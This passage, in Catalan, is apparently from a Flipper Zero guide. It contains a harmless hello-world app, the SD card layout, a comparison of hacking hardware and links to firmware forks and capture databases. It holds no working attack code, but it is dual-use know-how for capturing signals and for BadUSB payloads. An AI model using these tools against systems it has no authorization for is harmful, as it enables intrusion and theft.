**FBT (eina per compilar el microprogramari Flipper)** instal·la la cadena d'eines, obté dependències i coordina la compilació automàticament. Necessites Python 3.8+ i el compilador creuat ARM GCC.

### Escriure una aplicació personalitzada

Les aplicacions fan servir el format **paquet d’aplicacions Flipper (FAP)**. Cada aplicació viu en un directori de `applications_user/` o `applications/`.

```c
#include <furi.h>
#include <gui/gui.h>

static void my_app_draw_callback(Canvas* canvas, void* ctx) {
// FAP mínim; la font predeterminada només admet ASCII, així que la salutació queda en anglès.
    canvas_draw_str(canvas, 10, 32, "Hello, Flipper!");
}

int32_t my_app_main(void* p) {
    UNUSED(p);
    ViewPort* view_port = view_port_alloc();
    view_port_draw_callback_set(view_port, my_app_draw_callback, NULL);

    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    furi_delay_ms(3000);

    gui_remove_view_port(gui, view_port);
    view_port_free(view_port);
    furi_record_close(RECORD_GUI);
    return 0;
}
```

Les aplicacions accedeixen al maquinari amb l'API **Furi (Flipper universal Registry Implementation)**. L'accés als subsistemes es basa en registres: obre un registre, obtén un punter, fes-lo servir i tanca'l.

### Estructura de carpetes de la targeta SD

Flipper espera directoris concrets a la targeta SD:

| Directori | Contingut |
|-----------|-----------|
| `subghz/` | captura subgigahertz desades (`.sub`) |
| `nfc/` | Bolcats NFC desats (`.nfc`) |
| `lfrfid/` | Claus RFID LF desades (`.rfid`) |
| `infrared/` | Comandaments infraroig desats (`.ir`) |
| `ibutton/` | Claus iButton desades (`.ibtn`) |
| `badusb/` | Càrregues DuckyScript (`.txt`) |
| `apps/` | Aplicacions FAP de tercers |
| `music_player/` | Fitxers de música `.fmf` |
| `dolphin/` | Dades desades de Dolphin XP |

## Comparació de Flipper Zero amb alternatives

| Dispositiu | Preu | subgigahertz | NFC/RFID | infraroig | GPIO | Notes |
|------------|------|---------|----------|----|------|-------|
| **Flipper Zero** | ~$170 | Sí (CC1101) | Sí (complet) | Sí | Sí | Més versàtil en general |
| **HackRF One** (dispositiu SDR de banda ampla) | ~$350 | Sí (SDR) | No | No | Limitat | SDR complet, més abast de freqüències, sense NFC integrat |
| **RTL-SDR** | ~$25 | Només recepció | No | No | No | SDR més econòmic per analitzar recepció |
| **Proxmark3** | ~$300 | No | Sí (avançat) | No | Limitat | Millor anàlisi RFID/NFC, menys capacitat en altres àrees |
| **USB Rubber Ducky** | ~$60 | No | No | No | No | Només BadUSB, sense ràdio |
| **ChameleonMini** | ~$80 | No | Sí | No | Limitat | Emulador NFC/RFID especialitzat |
| **Wi-Fi Pineapple** | ~$100 | Només Wi-Fi | No | No | No | Plataforma especialitzada en atacs 802.11 |

Flipper Zero destaca per l'amplitud, no per la profunditat d'una categoria concreta. Per a RFID/NFC avançat, Proxmark3 és superior. Per a SDR complet, HackRF o USRP tenen més capacitat. Per a atacs 802.11, Wi-Fi Pineapple és millor. Flipper Zero és l'eina que convé portar quan encara no saps què trobaràs.

## Recursos comunitaris

| Recurs | URL | Què és |
|--------|-----|--------|
| **Documents oficials** | docs.flipper.net | API de microprogramari i especificacions de maquinari |
| **GitHub oficial** | github.com/flipperdevices | Codi font del microprogramari i seguiment d'incidències |
| **GitHub Unleashed** | github.com/DarkFlippers/unleashed-firmware | Bifurcació Unleashed |
| **GitHub Xtreme** | github.com/Flipper-XFW/Xtreme-Firmware | microprogramari Xtreme |
| **flipc.org** | flipc.org | Base de dades comunitària de senyals |
| **Repositori UberGuidoZ** | github.com/UberGuidoZ/Flipper | captura subgigahertz i bases de dades infraroig |
| **awesome-flipperzero** | github.com/djsime1/awesome-flipperzero | Llista seleccionada de recursos |
| **r/flipperzero** | reddit.com/r/flipperzero | Preguntes i respostes de la comunitat |
| **Flipper Discord** | discord.gg/flipperzero | Suport comunitari en temps real |

---

Flipper Zero et recompensa en proporció al temps que hi dediques. L'experiència inicial és accessible: llegir una targeta, capturar un comandament o escriure una càrrega de prova. Quan entens els detalls del microprogramari, l'expansió GPIO i el catàleg comunitari, es converteix en una eina per a tota una carrera en seguretat física, incrustada o sense fils.

Llegeix les teves targetes, prova els teus sistemes i obtén autorització escrita abans d'avaluar els d'una altra persona.

## Referències

- [Lloc oficial de Flipper Zero](https://flipperzero.one/)
- [Repositori GitHub de Flipper Zero](https://github.com/flipperdevices/flipperzero-firmware)
- [Documentació de Flipper Zero](https://docs.flipper.net/)
- [microprogramari Unleashed](https://github.com/DarkFlippers/unleashed-firmware)
- [microprogramari Xtreme](https://github.com/Flipper-XFW/Xtreme-Firmware)
- [Recursos Flipper d'UberGuidoZ](https://github.com/UberGuidoZ/Flipper)
- [Base de dades comunitària flipc.org](https://flipc.org/)
- [awesome-flipperzero (recull de recursos per a Flipper Zero)](https://github.com/djsime1/awesome-flipperzero)
- [Full de dades CC1101 - Texas Instruments](https://www.ti.com/product/CC1101)
- [Full de dades ST25R3916B - STMicroelectronics](https://www.st.com/en/nfc/st25r3916b.html)
- [Eines i tècniques essencials de pirateria de maquinari](https://simeononsecurity.com/articles/hardware-hacker-essential-tools-techniques/)
